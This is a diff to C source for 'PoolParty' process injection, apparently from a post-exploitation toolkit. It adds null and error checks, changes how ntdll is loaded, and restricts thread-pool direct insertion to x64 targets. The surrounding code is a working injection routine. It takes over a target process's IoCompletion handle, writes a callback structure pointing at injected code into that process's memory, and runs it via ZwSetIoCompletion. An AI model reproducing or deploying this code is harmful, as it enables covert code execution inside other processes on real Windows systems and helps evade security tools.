@@ -18,9 +18,19 @@ pNtDll* GetOrInitNtDll() {
 		ntdll = (pNtDll*)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, sizeof(pNtDll));
 		bError = ntdll == NULL;
 		if (!bError) {
-			HMODULE hNtDll = LoadLibraryA("ntdll.dll");
+			HMODULE hNtDll = NULL;
+			hNtDll = GetModuleHandleA("ntdll.dll");
+			if(hNtDll == NULL || hNtDll == INVALID_HANDLE_VALUE){
+				hNtDll = LoadLibraryA("ntdll.dll");
+			}
 			ntdll->pNtQueryInformationProcess = (NTSTATUS(NTAPI*)(HANDLE, PROCESSINFOCLASS, PVOID, ULONG, PULONG))GetProcAddress(hNtDll, "NtQueryInformationProcess");
 			ntdll->pNtQueryObject = (NTSTATUS(NTAPI*)(HANDLE, OBJECT_INFORMATION_CLASS, PVOID, ULONG, PULONG))GetProcAddress(hNtDll, "NtQueryObject");
+
+			if(ntdll->pNtQueryInformationProcess == NULL || ntdll->pNtQueryObject == NULL) {
+				HeapFree(hHeap, 0, ntdll);
+				ntdll = NULL;
+				return ntdll;
+			}
 			dprintf("[INJECT][inject_via_poolparty][ntdll_init] NtQueryInformationProcess: %p NtQueryObject: %p", ntdll->pNtQueryInformationProcess, ntdll->pNtQueryObject);
 			
 			ntdll->pZwSetIoCompletion = (NTSTATUS(NTAPI*)(HANDLE, PVOID, PVOID, NTSTATUS, ULONG_PTR))GetProcAddress(hNtDll, "ZwSetIoCompletion");
@@ -101,19 +111,17 @@ POOLPARTY_INJECTOR* GetOrInitPoolParty(DWORD dwSourceArch, DWORD dwDestinationAr
 	return poolLifeguard;
 };
 
-// For now we support only Windows 10 x64 -> Windows 10 x64
+// For now we support only Windows >= 10  and x64 -> x64
 BOOL supports_poolparty_injection(DWORD dwSourceArch, DWORD dwDestinationArch) {
 	OSVERSIONINFO os = { 0 };
-	BOOL isWow64;
-	IsWow64Process(GetCurrentProcess(), &isWow64);
 	os.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);
 	NTSTATUS(*pRtlGetVersion)(OSVERSIONINFO * os) = (NTSTATUS(*)(OSVERSIONINFO * os)) GetProcAddress(GetModuleHandleA("ntdll.dll"), "RtlGetVersion");
 	dprintf("[INJECT][supports_poolparty_injection] RtlGetVersion: %p", pRtlGetVersion);
 	if (!pRtlGetVersion(&os)) {
-		dprintf("[INJECT][supports_poolparty_injection] dwSourceArch: %d dwDestinationArch: %d isWow64: %d", dwSourceArch, dwDestinationArch, isWow64);
+		dprintf("[INJECT][supports_poolparty_injection] dwSourceArch: %d dwDestinationArch: %d", dwSourceArch, dwDestinationArch);
 		dprintf("[INJECT][supports_poolparty_injection] os.dwMajorVersion: %d os.dwMinorVersion: %d", os.dwMajorVersion, os.dwMinorVersion);
 		if (os.dwMajorVersion >= 10) {
-			if (dwDestinationArch == dwSourceArch && dwSourceArch == PROCESS_ARCH_X64) {
+			if (dwDestinationArch == dwSourceArch && (dwSourceArch == PROCESS_ARCH_X64 || dwSourceArch == PROCESS_ARCH_X86)) {
 				return TRUE;
 			}
 		}
@@ -133,8 +141,11 @@ HANDLE GetRemoteHandle(HANDLE hProcess, LPCWSTR typeName, DWORD dwDesiredAccess)
 
 	DWORD ntStatus = 0;
 	lpProcessInfo = HeapAlloc(hHeap, HEAP_ZERO_MEMORY, dwInformationSizeIn);
-	dprintf("[INJECT][inject_via_poolparty][get_remote_handle] lpProcessInfo: %p", lpProcessInfo);
 
+	if(lpProcessInfo == NULL) {
+		return INVALID_HANDLE_VALUE;
+	}
+	dprintf("[INJECT][inject_via_poolparty][get_remote_handle] lpProcessInfo: %p", lpProcessInfo);
 	while (TRUE) {
 		ntStatus = ntdll->pNtQueryInformationProcess(hProcess, ProcessHandleInformation, lpProcessInfo, dwInformationSizeIn, &dwInformationSizeOut);
 		dprintf("[INJECT][inject_via_poolparty][get_remote_handle] NtQueryInformationProcess() : %p", ntStatus);
@@ -144,11 +155,11 @@ HANDLE GetRemoteHandle(HANDLE hProcess, LPCWSTR typeName, DWORD dwDesiredAccess)
 			dwInformationSizeIn = dwInformationSizeOut;
 			continue;
 		}
-		if (ntStatus != 0 && ntStatus != 0xC0000004L) {
+		if (ntStatus != ERROR_SUCCESS && ntStatus != 0xC0000004L) {
 			HeapFree(hHeap, 0, lpProcessInfo);
 			return INVALID_HANDLE_VALUE;
 		}
-		if (ntStatus == 0) {
+		if (ntStatus == ERROR_SUCCESS) {
 			break;
 		}
 	}
@@ -183,15 +194,21 @@ DWORD remote_tp_direct_insertion(HANDLE hProcess, DWORD dwDestinationArch, LPVOI
 	pNtDll* ntDll = NULL;
 	DWORD dwResult = ERROR_POOLPARTY_GENERIC;
 	HANDLE hHeap = GetProcessHeap();
-	DWORD dwDirectSize = dwDestinationArch == PROCESS_ARCH_X64 ? TP_DIRECT_STRUCT_SIZE_X64 : TP_DIRECT_STRUCT_SIZE_X86;
+	LPVOID *Direct = NULL;
 
-	LPVOID *Direct = HeapAlloc(hHeap, HEAP_ZERO_MEMORY, dwDirectSize);
 	do {
 		ntDll = GetOrInitNtDll();
 		if (ntdll == NULL) {
 			BREAK_WITH_ERROR("[INJECT][inject_via_poolparty][remote_tp_direct_insertion] Cannot GetOrInitNtDll()", ERROR_POOLPARTY_GENERIC);
 		}
+		if (dwDestinationArch != PROCESS_ARCH_X64) {
+			BREAK_WITH_ERROR("[INJECT][inject_via_poolparty][remote_tp_direct_insertion] Currently only x86-64 destination arch is supported.", ERROR_POOLPARTY_VARIANT_FAILED);
+		}
 		if (!poolLifeguard->variants[POOLPARTY_TECHNIQUE_TP_DIRECT_INSERTION].isInjectionSupported) {
+			BREAK_WITH_ERROR("[INJECT][inject_via_poolparty][remote_tp_direct_insertion] This variant is not supported in this system.", ERROR_POOLPARTY_VARIANT_FAILED)
+		}
+		Direct = HeapAlloc(hHeap, HEAP_ZERO_MEMORY, TP_DIRECT_STRUCT_SIZE_X64);
+		if(Direct == NULL) {
 			BREAK_WITH_ERROR("[INJECT][inject_via_poolparty][remote_tp_direct_insertion] This variant is not supported in this system.", ERROR_POOLPARTY_VARIANT_FAILED)
 		}
 		hHijackHandle = GetRemoteHandle(hProcess, L"IoCompletion", IO_COMPLETION_ALL_ACCESS);
@@ -201,23 +218,17 @@ DWORD remote_tp_direct_insertion(HANDLE hProcess, DWORD dwDestinationArch, LPVOI
 		}
 
 		if (hHijackHandle != INVALID_HANDLE_VALUE) {
-
-			if (dwDestinationArch == PROCESS_ARCH_X64) {
-				*(QWORD*)((BYTE*)Direct + TP_DIRECT_STRUCT_CB_OFFSET_X64) = (QWORD) lpStartAddress;
-			}
-			if (dwDestinationArch == PROCESS_ARCH_X86) {
-				*(DWORD*)((BYTE*)Direct + TP_DIRECT_STRUCT_CB_OFFSET_X86 - 4) = (DWORD) PtrToPtr32(lpStartAddress);
-			}
-			LPVOID RemoteDirectAddress = VirtualAllocEx(hProcess, NULL, dwDirectSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+			*(QWORD*)((BYTE*)Direct + TP_DIRECT_STRUCT_CB_OFFSET_X64) = (QWORD) lpStartAddress;
+			LPVOID RemoteDirectAddress = VirtualAllocEx(hProcess, NULL, TP_DIRECT_STRUCT_SIZE_X64, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
 			if (!RemoteDirectAddress) {
 				BREAK_WITH_ERROR("[INJECT][inject_via_poolparty][remote_tp_direct_insertion] Unable to allocate RemoteDirectAddress.", ERROR_POOLPARTY_VARIANT_FAILED)
 			}
-			if (!WriteProcessMemory(hProcess, RemoteDirectAddress, Direct, dwDirectSize, NULL)) {
+			if (!WriteProcessMemory(hProcess, RemoteDirectAddress, Direct, TP_DIRECT_STRUCT_SIZE_X64, NULL)) {
 				BREAK_WITH_ERROR("[INJECT][inject_via_poolparty][remote_tp_direct_insertion] Unable to write target process memory.", ERROR_POOLPARTY_VARIANT_FAILED)
 			}
 			dwResult = ntDll->pZwSetIoCompletion(hHijackHandle, RemoteDirectAddress, lpParameter, 0, 0);
 			dprintf("[INJECT][inject_via_poolparty][remote_tp_wait_insertion] ZwSetIoCompletion: %d", dwResult);
-			dwResult = 0;
+			dwResult = ERROR_SUCCESS;
 		}
 	} while (0);
 	return dwResult;
